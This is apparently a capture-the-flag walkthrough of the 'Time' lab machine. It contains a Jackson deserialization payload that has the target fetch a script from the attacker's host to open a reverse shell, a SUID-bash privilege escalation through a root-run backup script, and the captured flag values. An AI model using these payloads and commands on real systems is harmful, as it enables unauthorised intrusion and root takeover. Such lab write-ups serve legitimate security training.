# Time

export IP=10.10.10.214

## Solution

Start with nmap ... <br>

cmd: nmap -sC -sV -oN nmap/init $IP
```
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 0f:7d:97:82:5f:04:2b:e0:0a:56:32:5d:14:56:82:d4 (RSA)
|   256 24:ea:53:49:d8:cb:9b:fc:d6:c4:26:ef:dd:34:c1:1e (ECDSA)
|_  256 fe:25:34:e4:3e:df:9f:ed:62:2a:a4:93:52:cc:cd:27 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Online JSON parser
```

lets run a gobuster and visit the website !! 

cmd: gobuster dir -u http://$IP -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -o gobuster/big.log -x .php,.html,.txt -t 80
```
/.htaccess (Status: 403)
/.htaccess.txt (Status: 403)
/.htpasswd (Status: 403)
/.htpasswd.php (Status: 403)
/.htpasswd.html (Status: 403)
/.htpasswd.txt (Status: 403)
/.htaccess.php (Status: 403)
/.htaccess.html (Status: 403)
/css (Status: 301)
/fonts (Status: 301)
/images (Status: 301)
/index.php (Status: 200)
/javascript (Status: 301)
/js (Status: 301)
/server-status (Status: 403)
/vendor (Status: 301)
```

Nothing really interesting from the source code nor enumeration! <br>

Trying a template injection (with the validate option) throws a java error!<br>

```
Validation failed: Unhandled Java exception: com.fasterxml.jackson.databind.exc.MismatchedInputException: Unexpected token (START_OBJECT), expected START_ARRAY: need JSON Array to contain As.WRAPPER_ARRAY type information for class java.lang.Object
```

Unhandled Java exception: com.fasterxml.jackson.databind.exc.MismatchedInputException: Unexpected token (START_OBJECT), expected START_ARRAY: need JSON Array to contain As.WRAPPER_ARRAY type information for class java.lang.Object

Since the packages names contain the app name, lets search for:
```
jackson data bind fasterxml vulns
```

There is a CVE for this vulnerability that i think that might work (CVE-2019-14540) <br>

Turns out that the right CVE is not the one above but: <br>

To trigger the deserialization execution we need to use the field "validate (beta!)" and supply this ! <br>

```
["ch.qos.logback.core.db.DriverManagerConnectionSource", {"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://10.10.14.242:8000/CVE-2019-12384/inject.sql'"}]
```

Inside the inject.sql will be a bash revshell to my machine <br>

And voila, we got a shell !

```
whoami
pericles

ls ~/
user.txt

cat ~/user.txt
FLAG: 68d5f92db9096f874e758f2a42eb2ca7
```

Now lets escalate to root ! <br>

After running linpeas one thing jumps out from the produced log ! 

```
/usr/bin/timer_backup.sh

-rw-r--r-- 1 root root 2743 Apr 23  2020 /etc/apt/sources.list.curtin.old                                                                                                                                                                  
-rw-r--r-- 1 root root 214 Oct 23 06:46 /etc/systemd/system/timer_backup.timer
-rw-r--r-- 1 root root 159 Oct 23 05:59 /etc/systemd/system/timer_backup.service
-rw-r--r-- 1 root root 106 Oct 23 04:57 /etc/systemd/system/web_backup.service
```

Well, the script is rebuilt after some runs but what had me rolling over my chair was that i was appending "touch /tmp/dummy" and it was not creating the file... <br>

After a while i remember that i found a similar issue in other cron thing where the root would not create things in the /tmp folder and then i changed for the user folder! <br>

And voila, it worked!! <br>

```
cmd: echo "cp /bin/bash /home/pericles/waza/root && chmod +s /home/pericles/waza/root"

WAIT FOR THE TASK TO RUN

./root -p 

whoami 
root

cat /root/root.txt
FLAG: 4b7dab85c3eafa42aededceab8481e2a
```